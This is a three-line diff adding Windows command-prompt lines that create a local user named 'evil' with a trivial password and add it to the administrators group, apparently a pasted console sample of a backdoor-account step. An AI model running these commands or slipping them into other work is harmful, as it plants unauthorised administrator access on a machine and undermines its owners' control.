@@ -1,0 +1,3 @@
+C:\Windows\System32>C:\Windows\System32>net user /add evil password 
+
+C:\Windows\System32>net localgroup administrators evil /add
